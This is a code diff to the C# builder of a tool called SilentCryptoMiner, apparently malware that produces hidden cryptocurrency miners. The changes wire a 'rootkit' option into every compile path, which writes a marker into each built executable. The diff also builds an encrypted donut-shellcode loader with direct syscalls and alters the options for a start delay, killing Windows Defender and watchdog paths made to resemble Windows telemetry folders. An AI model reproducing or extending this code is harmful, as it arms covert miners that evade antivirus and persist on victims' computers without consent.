@@ -96,6 +96,11 @@ namespace SilentCryptoMiner
                 }
                 return false;
             }
+
+            if (F.toggleRootkit.Checked)
+            {
+                MakeRootkitHelper(savePath);
+            }
             return true;
         }
 
@@ -142,6 +147,11 @@ namespace SilentCryptoMiner
                 }
                 return false;
             }
+
+            if (F.toggleRootkit.Checked)
+            {
+                MakeRootkitHelper(savePath);
+            }
             return true;
         }
 
@@ -179,7 +189,7 @@ namespace SilentCryptoMiner
             {
                 File.Delete(savePath + ".manifest");
             }
-            catch { }
+            catch { }  
 
             if (results.Errors.HasErrors)
             {
@@ -188,6 +198,11 @@ namespace SilentCryptoMiner
                     MessageBox.Show($"Line:  {E.Line}, Column: {E.Column}, Error message: {E.ErrorText}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 }
                 return false;
+            }
+
+            if (F.toggleRootkit.Checked)
+            {
+                MakeRootkitHelper(savePath);
             }
             return true;
         }
@@ -248,10 +263,15 @@ namespace SilentCryptoMiner
                 }
                 return false;
             }
+
+            if (F.toggleRootkit.Checked)
+            {
+                MakeRootkitHelper(savePath);
+            }
             return true;
         }
 
-        public static bool LoaderCompiler(string savePath, string inputFile, string args, string icoPath = "", bool AssemblyData = false, bool requireAdministrator = false, bool isWatchdog = false)
+        public static bool LoaderCompiler(string savePath, string inputFile, string args, string icoPath = "", bool AssemblyData = false, bool requireAdministrator = false)
         {
             try
             {
@@ -294,7 +314,7 @@ namespace SilentCryptoMiner
                     }
                 }
 
-                var sb = isWatchdog ? new StringBuilder(Properties.Resources.Injector) : new StringBuilder(Properties.Resources.Loader);
+                var sb = new StringBuilder(Properties.Resources.Loader);
                 bool buildResource = !string.IsNullOrEmpty(icoPath) || requireAdministrator || AssemblyData;
                 if (buildResource)
                 {
@@ -337,10 +357,11 @@ namespace SilentCryptoMiner
 
                 RunExternalProgram(paths["donut"], string.Format("\"{0}\" -a 2 -f 1", inputFile), currentDirectory, paths["donutlog"]);
                 string shellcodebytes = File.ReadAllText(paths["loader"], Encoding.GetEncoding("ISO-8859-1"));
-                string shellcode = Convert.ToBase64String(Encoding.GetEncoding("ISO-8859-1").GetBytes(Cipher(shellcodebytes, F.KEY)));
+                string shellcode = ToLiteral(Cipher(shellcodebytes, F.KEY));
+
+                sb.Replace("startDelay", F.txtStartDelay.Text);
                 sb.Replace("#KEYLENGTH", F.KEY.Length.ToString());
                 sb.Replace("#KEY", F.KEY);
-                sb.Replace("#DELAY", F.txtStartDelay.Text);
                 sb.Replace("#SHELLCODELENGTH", shellcodebytes.Length.ToString());
                 sb.Replace("#SHELLCODE", shellcode);
                 sb.Replace("#ARGS", args);
@@ -353,13 +374,18 @@ namespace SilentCryptoMiner
                     sb.Replace("DefKillWD", "TRUE");
                     CipherReplace(sb, "#KILLWD", killWDCommands);
                 }
-                File.WriteAllText(paths["filename"] + ".c", sb.ToString());
-                RunExternalProgram(paths["tcc"], string.Format("-Wl,-subsystem=windows \"{0}\" {1} \"{2}\" -xa \"{3}\" ", filename + ".c", buildResource ? "resource.o" : "", Path.Combine(currentDirectory, @"Includes\syscalls.c"), Path.Combine(currentDirectory, @"Includes\syscallsstubs.asm")), currentDirectory, paths["tcclog"]);
+                File.WriteAllText(paths["filename"] + ".c", sb.ToString(), Encoding.GetEncoding("ISO-8859-1"));
+                RunExternalProgram(paths["tcc"], string.Format("-Wl,-subsystem=windows \"{0}\" {1} \"{2}\" -xa \"{3}\"", filename + ".c", buildResource ? "resource.o" : "", Path.Combine(currentDirectory, @"Includes\syscalls.c"), Path.Combine(currentDirectory, @"Includes\syscallsstubs.asm")), currentDirectory, paths["tcclog"]);
                 File.Delete(paths["resource.o"]);
                 File.Delete(paths["filename"] + ".c");
                 File.Delete(paths["loader"]);
                 if (F.BuildErrorTest(!File.Exists(paths["filename"] + ".exe"), string.Format("Error: Failed at compiling program, check the error log at {0}.", paths["tcclog"])))
                     return false;
+
+                if (F.toggleRootkit.Checked)
+                {
+                    MakeRootkitHelper(savePath);
+                }
             }
             catch (Exception ex)
             {
@@ -367,6 +393,13 @@ namespace SilentCryptoMiner
                 return false;
             }
             return true;
+        }
+
+        public static void MakeRootkitHelper(string savePath)
+        {
+            byte[] newFile = File.ReadAllBytes(savePath);
+            Buffer.BlockCopy(BitConverter.GetBytes(0x7268), 0, newFile, 64, 2);
+            File.WriteAllBytes(savePath, newFile);
         }
 
         public static void RunExternalProgram(string filename, string arguments, string workingDirectory, string logpath)
@@ -473,6 +506,10 @@ namespace SilentCryptoMiner
             {
                 stringb.Replace("DefShellcode", "true");
             }
+            else
+            {
+                stringb.Replace("DefStartDelay", "true");
+            }
 
             if (F.chkInstall.Checked)
             {
@@ -528,8 +565,8 @@ namespace SilentCryptoMiner
                 stringb.Replace("%v4%", F.txtAssemblyVersion4.Text);
             }
 
-            stringb.Replace("#LIBSPATH", F.EncryptString(@"Microsoft\Libs\"));
-            stringb.Replace("#WATCHDOGPATH", F.EncryptString(@"Microsoft\Telemetry\"));
+            stringb.Replace("#LIBSPATH", F.EncryptString(@"Windows\Libs\"));
+            stringb.Replace("#WATCHDOGPATH", F.EncryptString(@"Windows\Telemetry\"));
             stringb.Replace("#WATCHDOGID", F.EncryptString($"\"{F.watchdogID}\""));
             stringb.Replace("#XID", F.EncryptString(F.xid));
             stringb.Replace("#EID", F.EncryptString(F.eid));
